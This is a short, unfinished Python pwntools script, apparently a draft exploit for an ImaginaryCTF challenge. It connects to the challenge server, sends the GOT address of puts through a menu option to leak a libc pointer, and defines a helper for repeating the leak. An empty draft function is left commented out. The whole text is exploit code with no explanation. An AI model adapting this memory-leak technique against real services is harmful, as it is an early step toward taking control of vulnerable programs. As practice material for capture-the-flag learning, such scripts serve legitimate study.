from pwn import *

puts_got =0x0601fb0
p = remote('chal.imaginaryctf.org', 42009)

p.sendlineafter('> ','4')
p.sendlineafter('..\n',p64(puts_got))

leak = int(p.recvline(),16)
print hex(leak)


def free_leak(addr):
	p.sendlineafter('> ','4')
	p.sendlineafter('..\n',p64(addr))


# def draft():
